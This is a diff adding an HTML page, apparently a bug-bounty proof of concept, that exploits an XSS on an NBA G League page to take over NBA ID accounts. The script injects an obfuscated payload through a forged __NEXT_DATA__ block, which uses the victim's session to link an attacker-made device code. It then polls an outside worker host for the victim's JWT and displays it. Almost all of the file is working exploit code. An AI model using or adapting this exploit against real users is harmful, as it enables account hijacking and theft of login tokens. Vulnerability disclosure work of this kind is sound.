@@ -1,0 +1,165 @@
+<!doctype html>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>NBA G League rendezvous token PoC</title>
+<style>
+  body { font: 16px/1.45 system-ui, sans-serif; max-width: 760px; margin: 40px auto; padding: 0 20px; }
+  textarea, button { display: block; width: 100%; box-sizing: border-box; margin: 12px 0; font: inherit; padding: 10px; }
+  textarea { min-height: 160px; overflow-wrap: anywhere; }
+  .muted { color: #555; }
+  .ok { color: #075; }
+  .error { color: #a00; }
+</style>
+
+<h1>NBA G League rendezvous token PoC</h1>
+<p id="status">Starting automatic proof of concept…</p>
+<p class="muted">Use only with a controlled NBA ID. This page creates a device code, triggers the G League XSS, polls for the linked account token, then alerts the full JWT.</p>
+<textarea id="jwt" hidden readonly aria-label="Captured JWT"></textarea>
+<button id="copy" hidden type="button">Copy full JWT</button>
+
+<script>
+  const WORKER = "https://nba-rendezvous-ato-poc.h1-3989880-research.workers.dev";
+  const TARGET = "https://gleague.nba.com/block-preview";
+  const CLEAN_URL = `${location.origin}${location.pathname}`;
+  const SESSION_KEY = "nba-gleague-rendezvous-ato-poc";
+  const status = document.getElementById("status");
+
+  function charCodeExpression(value) {
+    return `String.fromCharCode(${Array.from(value, character => character.charCodeAt(0)).join(",")})`;
+  }
+
+  function exploitScript(code) {
+    const fetchName = charCodeExpression("fetch");
+    const identityEndpoint = charCodeExpression("https://identity.nba.com/api/v1/rendezvous");
+    const post = charCodeExpression("POST");
+    const include = charCodeExpression("include");
+    const contentType = charCodeExpression("Content-Type");
+    const textPlain = charCodeExpression("text/plain");
+    const requestBody = charCodeExpression(JSON.stringify({ code }));
+    const timeoutName = charCodeExpression("setTimeout");
+    const historyName = charCodeExpression("history");
+    const backName = charCodeExpression("back");
+    const bindName = charCodeExpression("bind");
+    return `top[${fetchName}](${identityEndpoint},{method:${post},credentials:${include},headers:{[${contentType}]:${textPlain}},body:${requestBody},keepalive:true});top[${timeoutName}](top[${historyName}][${backName}][${bindName}](top[${historyName}]),5000)`;
+  }
+
+  function exploitUrl(code) {
+    const attackerNextData = {
+      props: { pageProps: {} },
+      page: "/block-preview",
+      query: {},
+      buildId: "yMjcRA_h0yAa7Vurx4rdf",
+      dynamicIds: [25182],
+      gssp: true,
+      scriptLoader: [{
+        id: "NBA_GLEAGUE_RENDEZVOUS_ATO",
+        strategy: "afterInteractive",
+        dangerouslySetInnerHTML: { __html: exploitScript(code) }
+      }]
+    };
+    const attrs = {
+      title: "NBA G League",
+      live_draft: "0",
+      draft_picks_1: 1,
+      draft_picks_1_0_name: "PoC",
+      draft_picks_1_0_note: "",
+      draft_picks_1_0_position: "G",
+      draft_picks_1_0_school: "TEST",
+      draft_picks_1_0_affiliated_team: "0",
+      notes_1: `<div id="__NEXT_DATA__">${JSON.stringify(attackerNextData)}</div>`,
+      header_affiliate: "Affiliate",
+      header_player: "Player",
+      header_position: "Position",
+      header_school: "School",
+      header_team: "Team"
+    };
+    return `${TARGET}?name=${encodeURIComponent("acf/draft-tracker")}&attrs=${encodeURIComponent(JSON.stringify(attrs))}`;
+  }
+
+  function findJwt(value) {
+    if (typeof value === "string" && /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+$/.test(value)) return value;
+    if (Array.isArray(value)) {
+      for (const item of value) {
+        const found = findJwt(item);
+        if (found) return found;
+      }
+    } else if (value && typeof value === "object") {
+      for (const item of Object.values(value)) {
+        const found = findJwt(item);
+        if (found) return found;
+      }
+    }
+    return null;
+  }
+
+  async function displayJwt(jwt) {
+    const output = document.getElementById("jwt");
+    const copy = document.getElementById("copy");
+    output.hidden = false;
+    output.value = jwt;
+    copy.hidden = false;
+    copy.onclick = async () => navigator.clipboard.writeText(jwt);
+    status.textContent = "Account token captured. Full JWT displayed and alerted.";
+    status.className = "ok";
+    sessionStorage.removeItem(SESSION_KEY);
+    alert(jwt);
+  }
+
+  async function poll(deviceId, code) {
+    history.replaceState(null, "", CLEAN_URL);
+    status.textContent = "Account link sent. Waiting for captured JWT…";
+    for (let attempt = 0; attempt < 120; attempt += 1) {
+      const response = await fetch(`${WORKER}/poll?device=${encodeURIComponent(deviceId)}&code=${encodeURIComponent(code)}`, {
+        cache: "no-store"
+      });
+      if (response.ok) {
+        const body = await response.json();
+        const jwt = findJwt(body);
+        if (jwt) {
+          await displayJwt(jwt);
+          return;
+        }
+      }
+      await new Promise(resolve => setTimeout(resolve, 1000));
+    }
+    throw new Error("No token returned before timeout.");
+  }
+
+  async function start() {
+    const savedSession = sessionStorage.getItem(SESSION_KEY);
+    if (savedSession) {
+      const session = JSON.parse(savedSession);
+      if (!session.deviceId || !session.code) throw new Error("Saved session is invalid.");
+      await poll(session.deviceId, session.code);
+      return;
+    }
+
+    status.textContent = "Creating attacker device code…";
+    const response = await fetch(`${WORKER}/session`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: "{}",
+      cache: "no-store"
+    });
+    if (!response.ok) throw new Error("Device-code generation failed.");
+
+    const session = await response.json();
+    if (!session.deviceId || !session.code) throw new Error("Worker returned an invalid session.");
+
+    status.textContent = "Device code created. Triggering G League XSS…";
+    sessionStorage.setItem(SESSION_KEY, JSON.stringify(session));
+    location.href = exploitUrl(session.code);
+  }
+
+  start().catch(error => {
+    status.className = "error";
+    status.textContent = error.message;
+  });
+
+  addEventListener("pageshow", event => {
+    if (event.persisted) start().catch(error => {
+      status.className = "error";
+      status.textContent = error.message;
+    });
+  });
+</script>
